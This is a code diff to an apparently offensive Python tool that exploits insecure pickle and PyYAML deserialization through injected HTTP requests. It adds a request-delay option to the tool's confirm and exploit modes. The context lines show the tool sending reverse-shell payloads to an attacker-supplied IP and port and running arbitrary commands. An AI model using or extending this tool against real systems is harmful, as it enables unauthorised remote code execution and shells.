@@ -50,6 +50,7 @@ def parse_args():
     confirm_vuln_parser.add_argument("-m", "--marker", required=False, help="Custom marker for injection point in request file. By default the marker is 'inject_here'")
     confirm_vuln_parser.add_argument("--lib", required=False, help="Use tool for specific serialization library: [picle, pyyaml, all]", choices=['pickle', 'pyyaml', 'all'])
     confirm_vuln_parser.add_argument("--http", required=False, action='store_true', help="Send requests over http.")
+    confirm_vuln_parser.add_argument("-d", '--delay', required=False, help="Delay in seconds between requests.")
 
     # create the parser for the exploit functionality
     exploit_parser = subparsers.add_parser('exploit', help="Try to exploit the vulnerability and execute custom command.")
@@ -60,6 +61,7 @@ def parse_args():
     exploit_parser.add_argument("--http", required=False, action='store_true', help="Send requests over http.")
     exploit_parser.add_argument("--revshell", required=False, action='store_true', help="Try a bunch of reverse shell payloads")
     exploit_parser.add_argument('--cmd', required=False, help='Provide command you want to execute')
+    exploit_parser.add_argument("-d", '--delay', required=False, help="Delay in seconds between requests.")
 
     # parse the arguments
     parsed_args = parent_parser.parse_args()
@@ -347,6 +349,7 @@ def measure_avg_rtt(req_lines, http):
         total_rtt = 0
         num_reqs = 5
 
+        print("[+] Measuring RTT...")
         for k in range(num_reqs):
             try:
                 response = requests.Session().send(prepared_req, verify=False)
@@ -354,8 +357,11 @@ def measure_avg_rtt(req_lines, http):
                 print_warning("[+] SSL error. Use --http flag?")
                 print()
                 exit(1)
-    
+
             total_rtt += response.elapsed.total_seconds()
+
+            if g_args.delay is not None: time.sleep(int(g_args.delay))
+    
 
         average_rtt = total_rtt/num_reqs 
         print(f"[+] Average RTT is: {round(average_rtt, 5)} seconds.")
@@ -437,6 +443,8 @@ def confirm_vuln():
                 print()
                 return
 
+        if g_args.delay is not None: time.sleep(int(g_args.delay))
+
     print_info("[+] The app seems to not be vulnerable")
     print()
 
@@ -476,7 +484,8 @@ def exploit():
         for rs_index, rs_cmd in enumerate(utils.reverse_shells):
             rs_cmd = rs_cmd.replace("ip_placeholder", revshell_ip).replace("port_placeholder", revshell_port).strip()
             payloads_list = generate_payload_silent(rs_cmd)
-            
+            print(f"[+] Sending reverse shell payload #{rs_index}... ")
+
             for num, payload in enumerate(payloads_list):
                 (method, url, headers, data) = parse_request_and_insert_payload(req_lines=request, payload=payload, custom_marker=g_args.marker, http=g_args.http)
                 req = Request(method=method, url=url, headers=headers, data=data)
@@ -490,8 +499,9 @@ def exploit():
                 except requests.exceptions.SSLError:
                     print_red("[+] SSL error. Use --http flag?")
                     exit(1)
-            print(f"[+] Sending reverse shell payload #{rs_index}... ")
-        
+                    
+                if g_args.delay is not None: time.sleep(int(g_args.delay))
+
         print()
         print_info("[+] Done\n")
         return
@@ -519,8 +529,9 @@ def exploit():
             except requests.exceptions.SSLError:
                     print_red("[+] SSL error. Use --http flag?")
                     exit(1)
-            
+
             print(f"\t[+] Sent request num #{num + 1} ")
+            if g_args.delay is not None: time.sleep(int(g_args.delay))
 
         
         print()
